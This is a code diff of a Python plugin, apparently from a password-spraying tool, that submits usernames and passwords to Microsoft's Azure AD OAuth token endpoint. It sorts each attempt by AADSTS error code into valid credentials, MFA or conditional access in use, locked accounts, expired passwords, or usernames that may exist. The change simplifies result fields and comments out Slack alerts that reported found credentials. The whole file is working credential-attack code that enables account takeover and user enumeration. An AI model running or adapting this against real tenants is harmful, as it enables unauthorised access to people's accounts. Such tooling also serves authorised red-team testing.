@@ -1,25 +1,10 @@
-import datetime, requests
+import requests
 import utils.utils as utils
 
 def msol_authenticate(url, username, password, useragent, pluginargs):
 
-    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-
     data_response = {
-        'timestamp': ts,
-        'username': username,
-        'password': password,
-        'success': False,
-        'change': False,
-        '2fa_enabled': False,
-        'type': None,
-        'code': None,
-        'name': None,
-        'action': None,
-        'headers': [],
-        'cookies': [],
-		'sourceip' : None,
-        'throttled' : False,
+        'result': None,    # Can be "success", "failure" or "potential"
 		'error' : False,
         'output' : ""
     }
@@ -52,65 +37,58 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
 
     try:
         resp = requests.post("{}/common/oauth2/token".format(url), headers=headers, data=body)
-        data_response['code'] = resp.status_code
 
         if resp.status_code == 200:
-            data_response['success'] = True
-            data_response['output'] = utils.prGreen(f"[!] SUCCESS! {resp.status_code} {username}:{password}")
-            utils.slacknotify(username, password)
+            data_response['result'] = "success"
+            data_response['output'] = f"[+] SUCCESS: {username}:{password}"
 
         else:
             response = resp.json()
             error = response["error_description"]
 
             if "AADSTS50126" in error:
-                data_response['success'] = False
-                data_response['output'] = utils.prRed(f"FAILED. {resp.status_code} Invalid username or password. Username: {username} could exist.")
+                data_response['result'] = "failure"
+                data_response['output'] = f"[-] FAILURE: Invalid username or password. Username: {username} could exist"
 
             elif "AADSTS50128" in error or "AADSTS50059" in error:
-                data_response['success'] = False
-                data_response['output'] = utils.prRed(f"FAILED. {resp.status_code} Tenant for account {username} is not using AzureAD/Office365")
+                data_response['result'] = "failure"
+                data_response['output'] = f"[-] FAILURE: Tenant for account {username} is not using AzureAD/Office365"
 
             elif "AADSTS50034" in error:
-                data_response['success'] = False
-                data_response['output'] = utils.prRed(f'FAILED. {resp.status_code} Tenant for account {username} is not using AzureAD/Office365')
+                data_response['result'] = "failure"
+                data_response['output'] = f'[-] FAILURE: Tenant for account {username} is not using AzureAD/Office365'
 
             elif "AADSTS50079" in error or "AADSTS50076" in error:
                 # Microsoft MFA response
-                data_response['2fa_enabled'] = True
-                data_response['success'] = True
-                data_response['code'] = "2FA Microsoft"
-                data_response['output'] = utils.prYellow(f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-                utils.slacklog("The response indicates MFA (Microsoft) is in use.")
-                utils.slacknotify(username, password)
+                data_response['result'] = "success"
+                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
+                #utils.slacklog("The response indicates MFA (Microsoft) is in use.")
+                #utils.slacknotify(username, password)
 
 
             elif "AADSTS50158" in error:
                 # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
-                data_response['2fa_enabled'] = True
-                data_response['success'] = True
-                data_response['code'] = "2FA Other"
-                data_response['output'] = utils.prYellow(f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-                utils.slacklog("The response indicates conditional access (MFA: DUO or other) is in use.")
-                utils.slacknotify(username, password)
+                data_response['result'] = "success"
+                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                #utils.slacklog("The response indicates conditional access (MFA: DUO or other) is in use.")
+                #utils.slacknotify(username, password)
 
             elif "AADSTS50053" in error:
                 # Locked out account or Smart Lockout in place
-                data_response['success'] = False
-                data_response['output'] = utils.prYellow(f"WARNING! {resp.status_code} The account {username} appears to be locked.")
+                data_response['result'] = "potential"
+                data_response['output'] = f"[?] WARNING! The account {username} appears to be locked."
 
 
             elif "AADSTS50055" in error:
                 # User password is expired
-                data_response['change'] = True
-                data_response['success'] = True
-                data_response['output'] = utils.prGreen(f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The user's password is expired.")
-                utils.slacknotify(username, password)
+                data_response['result'] = "success"
+                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The user's password is expired."
+                # utils.slacknotify(username, password)
 
             else:
                 # Unknown errors
-                data_response['success'] = False
-                data_response['output'] = utils.prRed(f"FAILED. {resp.status_code} Got an error we haven't seen yet for user {username}")
+                data_response['result'] = "failure"
+                data_response['output'] = f"[-] FAILURE: Got an error we haven't seen yet for user {username}"
 
     except Exception as ex:
         data_response['error'] = True
